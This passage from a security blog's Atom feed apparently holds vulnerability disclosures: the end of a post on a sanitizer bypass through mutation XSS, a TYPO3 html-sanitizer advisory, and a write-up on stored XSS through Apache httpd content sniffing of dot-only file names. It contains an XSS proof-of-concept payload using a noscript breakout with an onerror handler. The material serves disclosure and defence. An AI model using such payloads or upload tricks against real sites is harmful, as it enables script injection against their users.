alt=&quot;&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;&quot;&gt;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Observations&quot;&gt;&lt;a href=&quot;#Observations&quot; class=&quot;headerlink&quot; title=&quot;Observations&quot;&gt;&lt;/a&gt;Observations&lt;/h2&gt;&lt;p&gt;We have noticed a number of pa</summary>
      
    
    
    
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
    <category term="mxss" scheme="https://yaniv-git.github.io/tags/mxss/"/>
    
    <category term="bypass" scheme="https://yaniv-git.github.io/tags/bypass/"/>
    
    <category term="parser differential" scheme="https://yaniv-git.github.io/tags/parser-differential/"/>
    
  </entry>
  
  <entry>
    <title>Typo3 HTML Sanitizer By-passing via the processing instructions</title>
    <link href="https://yaniv-git.github.io/2023/11/13/Typo3%20HTML%20Sanitizer%20By-passing%20via%20the%20processing%20instructions/"/>
    <id>https://yaniv-git.github.io/2023/11/13/Typo3%20HTML%20Sanitizer%20By-passing%20via%20the%20processing%20instructions/</id>
    <published>2023-11-13T23:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.242Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h1><p>DOM processing instructions are not handled correctly. This allows bypassing the cross-site scripting mechanism of <a href="https://packagist.org/packages/typo3/html-sanitizer">typo3&#x2F;html-sanitizer</a>.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>Update to <code>typo3/html-sanitizer</code> versions 1.5.3 or 2.1.4 that fix the problem described.</p><h1 id="Credits"><a href="#Credits" class="headerlink" title="Credits"></a>Credits</h1><p>Thanks to Yaniv Nizry and Niels Dossche who reported this issue, and to TYPO3 core &amp; security team member Oliver Hader who fixed the issue.</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><a href="https://typo3.org/security/advisory/typo3-core-sa-2023-007">TYPO3-CORE-SA-2023-007</a></li><li><a href="https://github.com/TYPO3/html-sanitizer/security/advisories/GHSA-652v-xw37-rvw7">Disclosure &amp; PoC</a> (embargoed +90 days)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Problem&quot;&gt;&lt;a href=&quot;#Problem&quot; class=&quot;headerlink&quot; title=&quot;Problem&quot;&gt;&lt;/a&gt;Problem&lt;/h1&gt;&lt;p&gt;DOM processing instructions are not handled correc</summary>
      
    
    
    
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
    <category term="bypass" scheme="https://yaniv-git.github.io/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>Apache httpd Stored XSS by design</title>
    <link href="https://yaniv-git.github.io/2023/11/04/Apache%20httpd%20XSS%20by%20design/"/>
    <id>https://yaniv-git.github.io/2023/11/04/Apache%20httpd%20XSS%20by%20design/</id>
    <published>2023-11-04T23:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Approximately one year ago in 2022, I took part in a Capture The Flag (CTF) challenge with the objective of achieving Remote Code Execution (RCE). While tackling the challenge, I observed an unusual behavior that allowed for a Stored Cross-Site Scripting (XSS) attack by uploading a file, regardless of its extension. Upon closer investigation, I uncovered that the <em>“quirk”</em> was rooted in the Apache HTTP Server.</p><h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h1><p>By default, Apache httpd does not include the “no-sniff” header, <code>X-Content-Type-Options: nosniff</code>, and it does not perform automatic content type detection for files that lack a name or have only dots as their name, regardless of the file extension. For instance, a file named <code>.jpg</code> or <code>...jpg</code> would serve without any content type causing the browser to <em>“sniff”</em> the content, unlike files such as <code>test.jpg</code> which will result in <code>Content-type: image/jpeg</code>. This means that if an attacker has the capability to upload a file with no name or a name consisting solely of dots, it becomes possible to exploit a stored XSS vulnerability, regardless of the file extension’s constraints.</p><img src="/img/blogs/httpd/Image-1.png" style="width: 100%;"/><h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><h2 id="Content-type"><a href="#Content-type" class="headerlink" title="Content-type"></a>Content-type</h2><p>In HTTP (Hypertext Transfer Protocol), the <code>Content-Type</code> header is used to indicate the media type or MIME (Multipurpose Internet Mail Extensions) type of the data that is being sent in the HTTP response. It specifies the format of the content being returned by the server so that the client (e.g., a web browser) knows how to properly interpret and display the data.</p><p>Here are some examples of common media types:</p><ul><li><code>text/html</code>: Indicates that the content is HTML text.</li><li><code>text/plain</code>: Indicates that the content is plain text.</li><li><code>application/json</code>: Indicates that the content is JSON data.</li><li><code>application/xml</code>: Indicates that the content is XML data.</li><li><code>image/jpeg</code>, <code>image/png</code>, <code>image/gif</code>: Indicate that the content is an image in various formats.</li></ul><p>This header is crucial for the client to interpret the received data correctly. If the client doesn’t recognize or support the specified Content-Type, it may not be able to process the content as intended.</p><h2 id="Content-type-Sniffing"><a href="#Content-type-Sniffing" class="headerlink" title="Content-type Sniffing"></a>Content-type Sniffing</h2><p>Content-Type sniffing, is a behavior that web browsers and other user agents sometimes exhibit when they receive a resource with an ambiguous or missing Content-Type header. Content-Type sniffing involves the user agent trying to determine the media type of the resource by inspecting its actual content. </p><p>The purpose of content-type sniffing is to improve the user experience by attempting to render the content in a way that makes sense to the user. However, it can also introduce security risks. For example, if an attacker can control the content of a resource and trick the browser into interpreting it as a different media type, and might lead to security vulnerabilities.</p><p>To mitigate these risks, modern browsers provide web developers the ability to to disable content sniffing by adding the header: <code>X-Content-Type-Options: nosniff</code>.</p><p>Content-Type sniffing should not be relied upon for determining the media type of a resource. Instead, it’s best practice to always set the correct Content-Type header on the server side to ensure that the browser and other user agents can correctly process the content.</p><h1 id="Apache’s-response"><a href="#Apache’s-response" class="headerlink" title="Apache’s response"></a>Apache’s response</h1><p>After reaching the maintainers of Apache httpd, they replied that this is the expected behavior of <a href="https://httpd.apache.org/docs/2.4/mod/mod_mime.html">mod_mime</a> (the component that generates a content-type according to a file).</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options">X-Content-Type-Options</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type">Content-Type</a></li><li><a href="https://httpd.apache.org/docs/2.4/mod/mod_mime.html">mod_mime</a></li><li><a href="https://twitter.com/YNizry/status/1582733545759330306">Tweet</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Approximately one year ago in </summary>
      
    
    
    
    
    <category term="apache" scheme="https://yaniv-git.github.io/tags/apache/"/>
    
    <category term="content-type" scheme="https://yaniv-git.github.io/tags/content-type/"/>
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
  </entry>
  
</feed>
